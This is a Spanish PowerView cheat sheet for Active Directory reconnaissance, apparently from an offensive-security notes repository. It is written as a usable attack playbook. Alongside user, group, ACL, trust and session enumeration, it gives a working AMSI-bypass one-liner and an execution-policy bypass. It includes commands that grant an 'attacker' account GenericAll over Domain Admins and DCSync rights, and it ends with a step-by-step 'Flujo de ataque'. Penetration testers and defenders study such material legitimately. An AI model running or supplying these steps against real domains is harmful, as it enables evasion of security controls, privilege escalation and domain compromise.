# ⚡ PowerView - Enumeración de AD con PowerShell

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██╗   ██╗██╗███████╗██╗    ██╗
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██║   ██║██║██╔════╝██║    ██║
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██║   ██║██║█████╗  ██║ █╗ ██║
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██╔══╝  ██║███╗██║
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ╚████╔╝ ██║███████╗╚███╔███╔╝
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ 
                  Reconocimiento de Active Directory con PowerShell
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerView-Active_Directory-blue?style=for-the-badge" alt="PowerView">
  <img src="https://img.shields.io/badge/PowerShell-red?style=for-the-badge" alt="PowerShell">
</p>

---

## 📋 Índice

- [¿Qué es PowerView?](#-qué-es-powerview)
- [Preparación](#-preparación)
- [Enumeración del dominio](#-enumeración-del-dominio)
- [Enumeración de usuarios](#-enumeración-de-usuarios)
- [Enumeración de grupos](#-enumeración-de-grupos)
- [Enumeración de equipos](#-enumeración-de-equipos)
- [Enumeración de ACL](#-enumeración-de-acl)
- [Enumeración de relaciones de confianza](#-enumeración-de-relaciones-de-confianza)
- [Enumeración de GPO](#-enumeración-de-gpo)
- [Búsqueda de usuarios y accesos](#-búsqueda-de-usuarios-y-accesos)
- [Referencia rápida](#-referencia-rápida)

---

## 🎯 ¿Qué es PowerView?

**PowerView** es una herramienta de PowerShell para enumerar Active Directory (AD) y aprovechar configuraciones vulnerables:

- 🔍 **Enumeración** - Usuarios, grupos, equipos y objetos de directiva de grupo (GPO)
- 🔐 **ACL** - Detectar permisos mal configurados en listas de control de acceso
- 🌐 **Relaciones de confianza** - Representar las relaciones entre dominios
- 🎯 **Búsqueda de usuarios** - Localizar los equipos donde tienen sesiones iniciadas

---

## 🚀 Preparación

### Descargar PowerView

```powershell
# Desde PowerSploit
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# Desde SharpHound
# PowerView.ps1 incluido con BloodHound
```

> **Distribución:** la referencia a SharpHound/BloodHound reproduce una distribución histórica; PowerView se obtiene por separado desde [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon).

### Importar el módulo

```powershell
# Omitir la directiva de ejecución
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Importar
Import-Module .\PowerView.ps1

# O cargar en el ámbito actual (dot sourcing)
. .\PowerView.ps1
```

### Evasión de AMSI (si es necesaria)

```powershell
# Evasión sencilla
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

> **Compatibilidad:** el ejemplo de evasión de AMSI depende de detalles internos de Windows PowerShell/.NET y no es un método universal. Cambiar la directiva de ejecución del proceso tampoco garantiza que pueda cargarse cualquier script en un entorno administrado. Véanse las [características de seguridad de PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/learn/security-features) y la [precedencia de las directivas de ejecución](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies).

## 🏢 Enumeración del dominio

### Información básica del dominio

```powershell
# Obtener información del dominio
Get-Domain

# Obtener el SID del dominio
Get-DomainSID

# Obtener la directiva del dominio
Get-DomainPolicy

# Obtener los controladores de dominio
Get-DomainController
Get-DomainController -Domain other.domain.local

# Obtener información del bosque
Get-Forest
Get-ForestDomain
```

### Directiva del dominio

```powershell
# Directiva de contraseñas
(Get-DomainPolicy)."SystemAccess"

# Directiva de Kerberos
(Get-DomainPolicy)."KerberosPolicy"
```

---

## 👤 Enumeración de usuarios

### Listar usuarios

```powershell
# Todos los usuarios
Get-DomainUser

# Usuario concreto
Get-DomainUser -Identity admin

# Propiedades del usuario
Get-DomainUser -Identity admin -Properties *
Get-DomainUser -Identity admin -Properties samaccountname,description

# Usuarios con descripción
Get-DomainUser -LDAPFilter "(description=*)" | Select-Object samaccountname,description
```

### Buscar usuarios de interés

```powershell
# Usuarios con SPN (candidatos a Kerberoasting)
Get-DomainUser -SPN

# Usuarios sin preautenticación (AS-REP)
Get-DomainUser -PreauthNotRequired

# Usuarios con adminCount (protegidos)
Get-DomainUser -AdminCount

# Usuarios con contraseñas en la descripción
Get-DomainUser -LDAPFilter "(description=*pass*)" | Select-Object samaccountname,description
```

> **Interpretación:** `-AdminCount` filtra por el atributo adminCount; este puede permanecer marcado en cuentas que ya no pertenecen a un grupo protegido. El filtro de descripción busca el texto literal `pass`, no verifica que la descripción contenga una contraseña. Microsoft explica la persistencia de adminCount en su [guía de seguridad de AD](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/reducing-the-active-directory-attack-surface).

### Sesiones de usuarios

```powershell
# Dónde tiene sesión iniciada el usuario
Find-DomainUserLocation -UserIdentity admin

# Buscar usuarios con acceso de administrador
Find-LocalAdminAccess
```

---

## 👥 Enumeración de grupos

> **Alcance:** `Find-LocalAdminAccess` identifica equipos donde la identidad actual tiene acceso de administrador local; no enumera todos los usuarios administradores. Véase la [documentación oficial](https://powersploit.readthedocs.io/en/latest/Recon/Find-LocalAdminAccess/).

### Listar grupos

```powershell
# Todos los grupos
Get-DomainGroup

# Grupo concreto
Get-DomainGroup -Identity "Domain Admins"

# Miembros del grupo
Get-DomainGroupMember -Identity "Domain Admins"

# Miembros de forma recursiva
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### Grupos importantes

```powershell
# Administradores del dominio
Get-DomainGroupMember -Identity "Domain Admins"

# Administradores de empresa
Get-DomainGroupMember -Identity "Enterprise Admins"

# Administradores
Get-DomainGroupMember -Identity "Administrators"

# Buscar los grupos a los que pertenece el usuario
Get-DomainGroup -UserName admin
```

### Grupos locales

```powershell
# Administradores locales del equipo
Get-NetLocalGroupMember -ComputerName server01

# Administradores locales de todos los equipos
Find-DomainLocalGroupMember -GroupName Administrators
```

---

## 💻 Enumeración de equipos

### Listar equipos

```powershell
# Todos los equipos
Get-DomainComputer

# Equipo concreto
Get-DomainComputer -Identity server01

# Propiedades
Get-DomainComputer -Properties operatingsystem,serviceprincipalname

# Equipos con delegación sin restricciones
Get-DomainComputer -Unconstrained
```

### Buscar objetivos

```powershell
# Controladores de dominio
Get-DomainController

# Servidores
Get-DomainComputer -OperatingSystem "*Server*"

# Windows 10
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Sistemas operativos antiguos
Get-DomainComputer -OperatingSystem "*2008*"
```

### Recursos compartidos

```powershell
# Buscar recursos compartidos
Find-DomainShare

# Recursos compartidos con permiso de escritura
Find-DomainShare -CheckShareAccess

# Archivos de interés en recursos compartidos
Find-InterestingDomainShareFile
Find-InterestingDomainShareFile -Include *.txt,*.doc,*.xlsx
```

---

> **Corrección:** `-CheckShareAccess` comprueba acceso de lectura, no de escritura, pese al comentario original. Véase [Find-DomainShare](https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainShare/).

## 🔐 Enumeración de ACL

### ACL básicas

```powershell
# ACL del usuario
Get-DomainObjectAcl -Identity admin

# Resolver GUID
Get-DomainObjectAcl -Identity admin -ResolveGUIDs

# Derechos concretos
Get-DomainObjectAcl -Identity admin -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

### Buscar ACL de interés

```powershell
# GenericAll sobre el usuario
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*-1107"}

# WriteProperty (escribir propiedades)
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty"}

# WriteDacl (modificar la DACL)
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}
```

### Derechos de DCSync

```powershell
# Buscar derechos de DCSync
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match "Replication-Get") -or ($_.ActiveDirectoryRights -match "GenericAll")}
```

> **Interpretación de ACL:** las búsquedas anteriores muestran ACE candidatas. Para confirmar derechos efectivos o DCSync hay que revisar el objeto de destino, el principal, los grupos, la herencia y los derechos de replicación aplicables. El filtro no demuestra que la identidad actual tenga esos permisos.

### Modificar ACL

```powershell
# Añadir GenericAll para el usuario
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# Añadir derechos de DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

---

## 🤝 Enumeración de relaciones de confianza

### Relaciones de confianza del dominio

```powershell
# Obtener relaciones de confianza
Get-DomainTrust

# Todas las relaciones de confianza
Get-DomainTrust -Domain domain.local

# Representar todas las relaciones de confianza
Get-DomainTrustMapping
```

### Relaciones de confianza del bosque

```powershell
# Relaciones de confianza del bosque
Get-ForestTrust

# Dominios del bosque
Get-ForestDomain
```

### Tipos de relaciones de confianza

| Tipo de confianza | Dirección | Descripción |
|------------|-----------|-------------|
| Bidireccional | En ambos sentidos | Ambos dominios confían el uno en el otro |
| Entrante | Unidireccional | El otro dominio confía en el nuestro |
| Saliente | Unidireccional | Nuestro dominio confía en el otro |

---

## 📜 Enumeración de GPO

### Listar GPO

```powershell
# Todas las GPO
Get-DomainGPO

# GPO por nombre
Get-DomainGPO -Identity "Default Domain Policy"

# GPO de una OU concreta
Get-DomainGPO -ComputerIdentity server01
```

> **Corrección:** el ejemplo con `-ComputerIdentity server01` consulta GPO aplicadas a ese equipo; no especifica directamente una OU. Véase [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO/). El filtro de ACL siguiente tampoco restringe los resultados a los permisos efectivos de un usuario concreto.

### Buscar permisos sobre GPO

```powershell
# GPO que el usuario puede modificar
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"}
```

### Ubicaciones de GPO

```powershell
# OU a las que se aplica la GPO
Get-DomainOU -GPLink "{GPO-GUID}"

# GPO de un equipo concreto
Get-DomainGPO -ComputerIdentity "server01"
```

---

## 🎯 Búsqueda de usuarios y accesos

### Buscar acceso de administrador

```powershell
# ¿Dónde tenemos acceso de administrador local?
Find-LocalAdminAccess

# Con varios hilos
Find-LocalAdminAccess -Threads 10

# En equipos concretos
Find-LocalAdminAccess -ComputerFile computers.txt
```

> **Versiones:** `-ComputerFile` pertenece a variantes antiguas y no aparece en la firma documentada de [Find-LocalAdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Find-LocalAdminAccess/); la versión documentada recibe los equipos mediante `-ComputerName` o la canalización.

### Localizar usuarios

```powershell
# ¿Dónde tiene sesión iniciada el usuario?
Find-DomainUserLocation

# Usuario concreto
Find-DomainUserLocation -UserIdentity admin

# Solo equipos a los que tenemos acceso
Find-DomainUserLocation -CheckAccess
```

> **Sesiones:** sin filtros de usuario, `Find-DomainUserLocation` busca por defecto miembros de Domain Admins. `-CheckAccess` comprueba acceso administrativo a los equipos encontrados; no significa simplemente acceso de lectura. La disponibilidad de sesiones también depende de los permisos y de la configuración remota. Véase la [documentación de la función](https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainUserLocation/).

### Buscar sesiones

```powershell
# Sesiones del equipo
Get-NetSession -ComputerName dc01

# Usuarios con sesión iniciada
Get-NetLoggedon -ComputerName server01

# Sesiones RDP
Get-NetRDPSession -ComputerName server01
```

### Localizar usuarios concretos

```powershell
# Buscar administradores del dominio
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Comprobar dónde tienen sesiones iniciadas
Invoke-UserHunter

# Modo discreto
Invoke-UserHunter -Stealth
```

---

> **Nombres históricos:** `Invoke-UserHunter` aparece en versiones antiguas; el nombre documentado posterior es `Find-DomainUserLocation`. `-Stealth` reduce los equipos consultados a servidores seleccionados; no garantiza ausencia de registros o detección. Véanse la [lista histórica](https://powersploit.readthedocs.io/en/stable/Recon/README/) y la [función posterior](https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainUserLocation/).

## 📊 Referencia rápida

### Comandos esenciales

| Comando | Descripción |
|---------|-------------|
| `Get-Domain` | Información del dominio |
| `Get-DomainUser` | Listar usuarios |
| `Get-DomainGroup` | Listar grupos |
| `Get-DomainComputer` | Listar equipos |
| `Get-DomainController` | Listar controladores de dominio (DC) |
| `Get-DomainTrust` | Listar relaciones de confianza |
| `Get-DomainGPO` | Listar GPO |
| `Find-LocalAdminAccess` | Buscar acceso de administrador |
| `Find-DomainUserLocation` | Buscar sesiones de usuarios |

### Objetivos de Kerberos

| Comando | Descripción |
|---------|-------------|
| `Get-DomainUser -SPN` | Usuarios candidatos a Kerberoasting |
| `Get-DomainUser -PreauthNotRequired` | Usuarios candidatos a AS-REP roasting |
| `Get-DomainComputer -Unconstrained` | Delegación sin restricciones |

### Filtros habituales

```powershell
# Filtrar por propiedad
Get-DomainUser -Properties samaccountname,description

# Filtro LDAP
Get-DomainUser -LDAPFilter "(description=*admin*)"

# Cláusula Where
Get-DomainUser | ? {$_.samaccountname -like "*svc*"}
```

### Flujo de ataque

```powershell
# 1. Importar
Import-Module .\PowerView.ps1

# 2. Enumerar el dominio
Get-Domain
Get-DomainController

# 3. Buscar usuarios
Get-DomainUser -SPN | Select samaccountname
Get-DomainUser -PreauthNotRequired

# 4. Buscar acceso de administrador
Find-LocalAdminAccess

# 5. Localizar usuarios
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# 6. Revisar las ACL
Get-DomainObjectAcl -Identity admin -ResolveGUIDs
```

---

## 📚 Recursos

- [PowerView GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [Blog de HarmJ0y](https://blog.harmj0y.net/)
- [Guía rápida de PowerView](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Guías rápidas relacionadas
- [BloodHound](../../BloodHound/translations/README.es.md)
- [PowerShell](../../PowerShell/translations/README.es.md)
- [Mimikatz](../../Mimikatz/translations/README.es.md)

---

<p align="center">
  <b>⚡ ¡Reconocimiento de AD con PowerShell!</b><br>
  <i>PowerView - La herramienta clásica para enumerar AD</i>
</p>
